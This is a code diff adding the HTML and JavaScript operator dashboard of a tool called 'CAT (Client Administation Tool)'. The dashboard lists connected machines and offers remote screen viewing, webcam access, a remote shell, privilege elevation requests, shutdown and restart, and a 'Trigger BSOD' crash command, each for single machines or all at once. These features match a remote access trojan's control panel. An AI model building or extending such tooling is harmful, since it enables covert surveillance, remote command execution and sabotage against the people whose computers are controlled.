@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CAT @dkydivyansh</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.0/socket.io.min.js"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #0a0b0e;
+            color: #e1e1e1;
+        }
+        .control-panel {
+            background: rgba(30, 32, 40, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .button {
+            background: rgba(76, 175, 80, 0.8);
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 10px rgba(76, 175, 80, 0.3);
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+            transition: background 0.3s ease;
+        }
+        .button:hover {
+            background: rgba(76, 175, 80, 0.9);
+            box-shadow: 0 0 15px rgba(76, 175, 80, 0.5);
+            transform: translateY(-2px);
+        }
+        .button.warning {
+            background: rgba(255, 152, 0, 0.8);
+            box-shadow: 0 0 10px rgba(255, 152, 0, 0.3);
+        }
+        .button.warning:hover {
+            background: rgba(255, 152, 0, 0.9);
+            box-shadow: 0 0 15px rgba(255, 152, 0, 0.5);
+        }
+        .button.danger {
+            background: rgba(244, 67, 54, 0.8);
+            box-shadow: 0 0 10px rgba(244, 67, 54, 0.3);
+        }
+        .button.danger:hover {
+            background: rgba(244, 67, 54, 0.9);
+            box-shadow: 0 0 15px rgba(244, 67, 54, 0.5);
+        }
+        .message-input {
+            padding: 10px;
+            margin: 5px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            width: 300px;
+        }
+        #clientList {
+            list-style: none;
+            padding: 0;
+        }
+        .client-item {
+            background: rgba(30, 32, 40, 0.7);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            transition: transform 0.2s ease;
+        }
+        .client-item:hover {
+            transform: translateX(5px);
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.4);
+        }
+        .client-info {
+            margin-bottom: 10px;
+        }
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        .status-online {
+            background: #4CAF50;
+            box-shadow: 0 0 10px #4CAF50;
+            animation: glow 1.5s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from {
+                box-shadow: 0 0 5px #4CAF50;
+            }
+            to {
+                box-shadow: 0 0 15px #4CAF50;
+            }
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .modal.show {
+            opacity: 1;
+        }
+        .modal-content {
+            position: relative;
+            background: rgba(25, 27, 35, 0.95);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            color: #e1e1e1;
+            margin: 15% auto;
+            padding: 20px;
+            width: 50%;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            transform: scale(0.7);
+            transition: transform 0.3s ease;
+        }
+        .modal.show .modal-content {
+            transform: scale(1);
+        }
+        .close-modal {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            font-size: 24px;
+            cursor: pointer;
+            color: #666;
+            transition: color 0.3s ease;
+        }
+        .close-modal:hover {
+            color: #000;
+        }
+        .modal-title {
+            margin-top: 0;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .modal-input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            box-sizing: border-box;
+            resize: vertical;
+            min-height: 100px;
+            font-family: inherit;
+            background: rgba(40, 42, 50, 0.8);
+            color: #e1e1e1;
+        }
+        .modal-buttons {
+            text-align: right;
+        }
+        .client-count {
+            color: #666;
+            margin-bottom: 10px;
+        }
+        .admin-status {
+            margin-left: 10px;
+            font-size: 0.9em;
+            font-weight: bold;
+        }
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: -300px;
+            padding: 15px;
+            border-radius: 4px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            transition: right 0.3s ease;
+            z-index: 1100;
+            width: 280px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .notification.show {
+            right: 20px;
+        }
+
+        .notification.error {
+            background: rgba(244, 67, 54, 0.9);
+        }
+
+        .notification.success {
+            background: rgba(76, 175, 80, 0.9);
+        }
+
+        .notification.info {
+            background: rgba(33, 150, 243, 0.9);
+        }
+
+        /* Add a subtle gradient background to the body */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0a0b0e 0%, #1a1b1f 100%);
+            z-index: -1;
+        }
+
+        h1, h2, h3 {
+            color: #fff;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+        }
+
+        .disconnect-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 11, 14, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 2000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .disconnect-popup.show {
+            display: flex;
+            opacity: 1;
+        }
+
+        .disconnect-content {
+            background: rgba(25, 27, 35, 0.95);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            margin: auto;
+            transform: translateY(-20px);
+            transition: transform 0.3s ease;
+        }
+
+        .disconnect-popup.show .disconnect-content {
+            transform: translateY(0);
+        }
+
+        .disconnect-icon {
+            font-size: 48px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: #4CAF50;
+            border-radius: 50%;
+            margin: 20px auto;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <h1>CAT (Client Administation Tool) -- @dkydivyansh </h1>
+    
+    <div class="control-panel">
+        <h2>Global Controls</h2>
+        <button onclick="openMessageModal('global')" class="button">Send Message to All</button>
+        <button onclick="confirmAction('shutdown')" class="button danger">Shutdown All</button>
+        <button onclick="confirmAction('restart')" class="button warning">Restart All</button>
+        <button onclick="confirmAction('info')" class="button">Info All</button>
+        <button onclick="confirmAction('restartclient')" class="button warning">Restart All Clients</button>
+        <button onclick="confirmAction('trigger_bsod')" class="button danger">Trigger BSOD</button>
+        <button onclick="confirmAction('restart_server')" class="button danger">Restart Server</button>
+    </div>
+
+    <h2>Connected Clients <span id="clientCount" class="client-count"></span></h2>
+    <ul id="clientList"></ul>
+
+    <!-- Message Modal -->
+    <div id="messageModal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeMessageModal()">&times;</span>
+            <h3 class="modal-title">Send Message</h3>
+            <textarea id="messageText" class="modal-input" rows="4" placeholder="Enter your message here..."></textarea>
+            <div class="modal-buttons">
+                <button onclick="closeMessageModal()" class="button" style="background: #999;">Cancel</button>
+                <button onclick="sendMessage()" class="button">Send Message</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="notification" class="notification"></div>
+
+    <div id="disconnectPopup" class="disconnect-popup">
+        <div class="disconnect-content">
+            <div class="disconnect-icon">📡</div>
+            <h2>Connection Lost</h2>
+            <p>Attempting to reconnect to the server...</p>
+            <div class="loading-spinner"></div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        let activeClients = {};
+        let currentMessageTarget = null;
+        let currentCheckingClientId = null;
+
+        // Connect to the server and request client list
+        socket.on('connect', () => {
+            console.log("Connected to server");
+            hideDisconnectPopup();
+            socket.emit('request_client_list');
+        });
+
+        // Update client list dynamically
+        socket.on("client_update", (clients) => {
+            activeClients = clients;
+            updateClientList();
+        });
+
+        function updateClientList() {
+            const clientList = document.getElementById("clientList");
+            const clientCount = document.getElementById("clientCount");
+            clientList.innerHTML = "";
+            
+            const clientsCount = Object.keys(activeClients).length;
+            clientCount.textContent = `(${clientsCount} client${clientsCount !== 1 ? 's' : ''} connected)`;
+            
+            for (const clientId in activeClients) {
+                const client = activeClients[clientId];
+                if (clientId !== socket.id) {
+                    const listItem = document.createElement('li');
+                    listItem.className = 'client-item';
+                    listItem.innerHTML = `
+                        <div class="client-info">
+                            <span class="status-indicator status-online"></span>
+                            <strong>${client.username}</strong> (${client.os_version})
+                            <span class="admin-status" id="adminStatus_${clientId}">⚪ Checking privileges...</span>
+                            <button id="elevateBtn_${clientId}" 
+                                    onclick="requestElevation('${clientId}')" 
+                                    class="button warning" 
+                                    style="display: none;">
+                                🛡️ Run as Administrator
+                            </button>
+                        </div>
+                        <div class="client-controls">
+                            <button onclick="openMessageModal('${clientId}')" class="button">Send Message</button>
+                            <button onclick="openScreenShare('${clientId}')" class="button">Screen Share</button>
+                            <button onclick="openCamera('${clientId}')" class="button">Camera</button>
+                            <button onclick="openShell('${clientId}')" class="button">Shell</button>
+                            <button onclick="confirmAction('shutdown', '${clientId}')" class="button danger">Shutdown</button>
+                            <button onclick="confirmAction('restart', '${clientId}')" class="button warning">Restart</button>
+                            <button onclick="confirmAction('info', '${clientId}')" class="button">Info</button>
+                            <button onclick="confirmAction('restartclient', '${clientId}')" class="button">Restart Client</button>
+                            <button onclick="confirmAction('trigger_bsod', '${clientId}')" class="button danger">Trigger BSOD</button>
+                        </div>
+                    `;
+                    clientList.appendChild(listItem);
+                    checkAdminStatus(clientId);
+                }
+            }
+        }
+
+        function openScreenShare(clientId) {
+            const width = 1280;
+            const height = 800;
+            const left = (screen.width - width) / 2;
+            const top = (screen.height - height) / 2;
+            
+            window.open(
+                `/screen/${clientId}`,
+                'screenShare',
+                `width=${width},height=${height},left=${left},top=${top}`
+            );
+        }
+
+        function openCamera(clientId) {
+            const width = 1280;
+            const height = 800;
+            const left = (screen.width - width) / 2;
+            const top = (screen.height - height) / 2;
+            
+            window.open(
+                `/camera/${clientId}`,
+                'cameraShare',
+                `width=${width},height=${height},left=${left},top=${top}`
+            );
+        }
+
+        function openMessageModal(target) {
+            currentMessageTarget = target;
+            const modal = document.getElementById('messageModal');
+            const title = modal.querySelector('.modal-title');
+            title.textContent = target === 'global' ? 'Send Message to All Clients' : 'Send Message to Client';
+            modal.style.display = 'block';
+            setTimeout(() => modal.classList.add('show'), 10);
+            document.getElementById('messageText').focus();
+        }
+
+        function closeMessageModal() {
+            const modal = document.getElementById('messageModal');
+            modal.classList.remove('show');
+            setTimeout(() => {
+                modal.style.display = 'none';
+                document.getElementById('messageText').value = '';
+                currentMessageTarget = null;
+            }, 300);
+        }
+
+        function sendMessage() {
+            const message = document.getElementById('messageText').value.trim();
+            if (!message) {
+                alert('Please enter a message');
+                return;
+            }
+
+            if (currentMessageTarget === 'global') {
+                sendGlobalCommand('message', message);
+                showNotification('Message sent to all clients');
+            } else {
+                sendCommand(currentMessageTarget, 'message', message);
+                const clientName = activeClients[currentMessageTarget]?.username || 'Unknown Client';
+                showNotification(`Message sent to "${clientName}"`);
+            }
+
+            closeMessageModal();
+        }
+
+        // Send a command to a specific client
+        function sendCommand(clientId, command, message = null) {
+            const payload = { 
+                unique_id: clientId, 
+                command: command 
+            };
+            
+            if (message) {
+                payload.message = message;
+            }
+            
+            socket.emit("command", payload);
+            console.log(`Command '${command}' sent to client ${clientId}`);
+        }
+
+        // Send a command to all clients
+        function sendGlobalCommand(command, message = null) {
+            const payload = { command };
+            
+            if (message) {
+                payload.message = message;
+            }
+
+            socket.emit("global_command", payload);
+            console.log(`Global command '${command}' sent to all clients`);
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('messageModal');
+            if (event.target === modal) {
+                closeMessageModal();
+            }
+        }
+
+        // Handle Enter key in message textarea
+        document.getElementById('messageText').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                sendMessage();
+            }
+        });
+
+        // Add this function to handle shell window opening
+        function openShell(clientId) {
+            const width = 800;
+            const height = 600;
+            const left = (screen.width - width) / 2;
+            const top = (screen.height - height) / 2;
+            
+            window.open(
+                `/shell/${clientId}`,
+                'shellWindow',
+                `width=${width},height=${height},left=${left},top=${top}`
+            );
+        }
+
+        function checkAdminStatus(clientId) {
+            console.log('Checking admin status for client:', clientId);
+            currentCheckingClientId = clientId;
+            sendCommand(clientId, 'check_admin');
+        }
+
+        function requestElevation(clientId) {
+            console.log('Requesting elevation for client:', clientId); // Debug logging
+            sendCommand(clientId, 'elevate');
+        }
+
+        // Update the socket.on listener for shell_output
+        socket.on('shell_output', (data) => {
+            console.log('Received shell output:', data);
+            
+            if (data.type === 'admin_check') {
+                const clientId = data.clientId || data.unique_id || currentCheckingClientId;
+                const isAdmin = data.isAdmin === true || data.output === 'Administrator';
+                
+                if (clientId) {
+                    updateAdminStatus(clientId, isAdmin);
+                    currentCheckingClientId = null;
+                }
+            } else if (data.type === 'error' && data.output === 'Failed to elevate privileges.') {
+                const clientName = data.client_info?.username || 'Unknown Client';
+                showNotification(`Failed to elevate privileges. User "${clientName}" denied the request.`, 'error');
+            }
+        });
+
+        function updateAdminStatus(clientId, isAdmin) {
+            console.log('Updating admin status:', { clientId, isAdmin }); // Debug logging
+            const statusElement = document.getElementById(`adminStatus_${clientId}`);
+            const elevateBtn = document.getElementById(`elevateBtn_${clientId}`);
+            
+            if (!statusElement || !elevateBtn) {
+                console.error('Elements not found for client:', clientId);
+                console.log('Status element:', statusElement);
+                console.log('Elevate button:', elevateBtn);
+                return;
+            }
+
+            if (isAdmin) {
+                statusElement.textContent = '🛡️ Administrator';
+                statusElement.style.color = '#4CAF50';
+            } else {
+                statusElement.textContent = '👤 Standard User';
+                statusElement.style.color = '#f44336';
+            }
+            
+            elevateBtn.style.display = isAdmin ? 'none' : 'inline-block';
+        }
+
+        function showNotification(message, type = 'info') {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            
+            // Remove any existing classes
+            notification.classList.remove('error', 'success', 'info');
+            
+            // Add the appropriate class
+            notification.classList.add(type);
+            notification.classList.add('show');
+            
+            // Hide notification after 5 seconds
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 5000);
+        }
+
+        function confirmAction(action, clientId = null) {
+            const isGlobal = !clientId;
+            const actionMessages = {
+                'shutdown': `Are you sure you want to shutdown ${isGlobal ? 'all clients' : 'this client'}?`,
+                'restart': `Are you sure you want to restart ${isGlobal ? 'all clients' : 'this client'}?`,
+                'restartclient': `Are you sure you want to restart the client application${isGlobal ? ' on all machines' : ''}?`,
+                'trigger_bsod': `Are you sure you want to trigger BSOD ${isGlobal ? 'on all clients' : 'on this client'}?`,
+            };
+
+            if (actionMessages[action]) {
+                if (confirm(actionMessages[action])) {
+                    if (isGlobal) {
+                        sendGlobalCommand(action);
+                        showNotification(`${action.charAt(0).toUpperCase() + action.slice(1)} command sent to all clients`);
+                    } else {
+                        sendCommand(clientId, action);
+                        const clientName = activeClients[clientId]?.username || 'Unknown Client';
+                        showNotification(`${action.charAt(0).toUpperCase() + action.slice(1)} command sent to "${clientName}"`);
+                    }
+                }
+            } else {
+                // For actions that don't need confirmation (like 'info')
+                if (isGlobal) {
+                    sendGlobalCommand(action);
+                    showNotification(`${action.charAt(0).toUpperCase() + action.slice(1)} command sent to all clients`);
+                } else {
+                    sendCommand(clientId, action);
+                    const clientName = activeClients[clientId]?.username || 'Unknown Client';
+                    showNotification(`${action.charAt(0).toUpperCase() + action.slice(1)} command sent to "${clientName}"`);
+                }
+            }
+        }
+
+        // Add listener for action status updates
+        socket.on('action_status', (data) => {
+            const clientName = data.client_info?.username || 'Unknown Client';
+            const action = data.action;
+            
+            const actionMessages = {
+                'shutdown': `Successfully initiated shutdown on "${clientName}"`,
+                'restart': `Successfully initiated restart on "${clientName}"`,
+                'restartclient': `Successfully restarted client application on "${clientName}"`,
+                'trigger_bsod': `Successfully triggered BSOD on "${clientName}"`,
+                'info': `Successfully retrieved info from "${clientName}"`,
+                'message': `Message successfully delivered to "${clientName}"`
+            };
+
+            if (actionMessages[action]) {
+                showNotification(actionMessages[action], 'success');
+            }
+        });
+
+        // Add connection state handling
+        socket.on('disconnect', () => {
+            console.log("Disconnected from server");
+            showDisconnectPopup();
+        });
+
+        function showDisconnectPopup() {
+            const popup = document.getElementById('disconnectPopup');
+            popup.classList.add('show');
+        }
+
+        function hideDisconnectPopup() {
+            const popup = document.getElementById('disconnectPopup');
+            popup.classList.remove('show');
+        }
+    </script>
+</body>
+</html>
